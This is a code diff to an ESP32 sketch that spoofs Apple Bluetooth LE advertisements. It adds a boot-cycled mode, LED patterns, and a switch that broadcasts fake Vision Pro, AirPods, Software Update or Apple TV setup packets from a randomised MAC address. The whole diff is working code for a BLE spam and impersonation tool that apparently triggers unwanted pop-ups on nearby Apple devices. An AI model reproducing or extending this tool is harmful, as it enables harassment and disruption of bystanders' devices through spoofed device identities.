@@ -6,6 +6,8 @@
 #include <BLEDevice.h>
 #include <BLEUtils.h>
 #include <BLEServer.h>
+#include <Preferences.h>
+
 #include <esp_arduino_version.h>
 
 #include "devices.hpp"
@@ -22,14 +24,36 @@
 BLEAdvertising *pAdvertising;  // global variable
 uint32_t delayMilliseconds = 100;
 
+int currentMode = 0;
+Preferences preferences;
+
+#define RIGHT_LED 12
+#define LEFT_LED 13
+
 void setup() {
   Serial.begin(115200);
   Serial.println("Starting ESP32 BLE");
 
+  // Open "storage" namespace (false = read/write)
+  preferences.begin("my-app", false);
+
+  // Get the current mode, default to 0 if it doesn't exist
+  int mode = preferences.getInt("mode", 0);
+  
+  Serial.printf("Current Mode: %d\n", mode);
+  currentMode = mode;
+
+  // Increment and wrap 0 through 4
+  mode = (mode + 1) % 5;
+  
+  // Save it back for next time
+  preferences.putInt("mode", mode);
+  preferences.end();
+
   // This is specific to the AirM2M ESP32 board
   // https://wiki.luatos.com/chips/esp32c3/board.html
-  pinMode(12, OUTPUT);
-  pinMode(13, OUTPUT);
+  pinMode(RIGHT_LED, OUTPUT);
+  pinMode(LEFT_LED, OUTPUT);
 
   BLEDevice::init("AirPods 69");
 
@@ -46,12 +70,17 @@ void setup() {
   pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
 }
 
-void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, char* data, size_t dataSize) {
+void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
+  uint8_t packet[31];
+  size_t packetLen;
+  generatePacket(dev, packet, packetLen);
+  Serial.printf("Broadcasting %s (Length: %d)...\n", dev.name, packetLen);
+
   #ifdef ESP_ARDUINO_VERSION_MAJOR
     #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
-        oAdvertisementData.addData(String((char*)data, dataSize));
+        oAdvertisementData.addData(String((char*)packet, packetLen));
     #else
-        oAdvertisementData.addData(std::string((char*)data, dataSize));
+        oAdvertisementData.addData(std::string((char*)packet, packetLen));
     #endif
   #endif
 }
@@ -60,29 +89,32 @@ void setRandomDeviceData(BLEAdvertisementData &oAdvertisementData) {
   // Randomly pick data from one of the devices
   int idx = random(0, sizeof(ALL_DEVICES) / sizeof(ALL_DEVICES[0]));
   AppleDevice dev = ALL_DEVICES[idx];
-
-  uint8_t packet[31];
-  size_t packetLen;
-  generatePacket(dev, packet, packetLen);
-
-  Serial.printf("Broadcasting %s (Length: %d)...\n", dev.name, packetLen);
-  setAdvertisementData(oAdvertisementData, (char*)packet, packetLen);
+  setAdvertisementData(oAdvertisementData, dev);
 }
 
-void setCustomBatteryLevel(BLEAdvertisementData &oAdvertisementData) {
-  uint8_t data[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 
-    0x45,
-    0x45,
-    0xC4,
-    0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a
-  };
-  setAdvertisementData(oAdvertisementData, (char*)data, sizeof(data));
+// mode 0 = flash both LEDs
+// mode 1 = flash only right LED
+// mode 2 = flash only left LED
+// mode 3 = both LEDs ON
+// mode 4 = both LEDs OFF
+void controlLight(bool start){
+  if (start){
+    if (currentMode == 0 || currentMode == 1 || currentMode == 3){
+      digitalWrite(RIGHT_LED, HIGH);
+    }
+    if (currentMode == 0 || currentMode == 2 || currentMode == 3){
+      digitalWrite(LEFT_LED, HIGH);
+    }
+  } else {
+    if (currentMode == 0 || currentMode == 1 || currentMode == 2 || currentMode == 4){
+      digitalWrite(RIGHT_LED, LOW);
+      digitalWrite(LEFT_LED, LOW);
+    }
+  }
 }
 
 void loop() {
-  // Turn lights on during "busy" part
-  digitalWrite(12, HIGH);
-  digitalWrite(13, HIGH);
+  controlLight(true);
 
   // First generate fake random MAC
   esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
@@ -98,10 +130,24 @@ void loop() {
   }
 
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
-  setRandomDeviceData(oAdvertisementData);
-  // setCustomBatteryLevel(oAdvertisementData);
-  // setAdvertisementData(oAdvertisementData, (char*)SHORT_DEVICES[12], 23);
-  // setAdvertisementData(oAdvertisementData, DEVICES[0], 31);
+
+  switch (currentMode){
+    case 0:
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[VISION_PRO]);
+      break;
+    case 1:
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS]);
+      break;
+    case 2:
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[SOFTWARE_UPDATE]);
+      break;
+    case 3:
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_SETUP]);
+      break;
+    case 4:
+      setRandomDeviceData(oAdvertisementData);
+      break;
+  }
 
   /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
       the three advertising PDU types when you want to connect to Apple devices.
@@ -142,12 +188,10 @@ void loop() {
   //pAdvertising->setMaxPreferred(0x20);
 
   // Start advertising
-  Serial.println("Sending Advertisement...");
   pAdvertising->start();
 
   // Turn lights off while "sleeping"
-  digitalWrite(12, LOW);
-  digitalWrite(13, LOW);
+  controlLight(false);
   delay(delayMilliseconds); // delay for delayMilliseconds ms
   pAdvertising->stop();
 
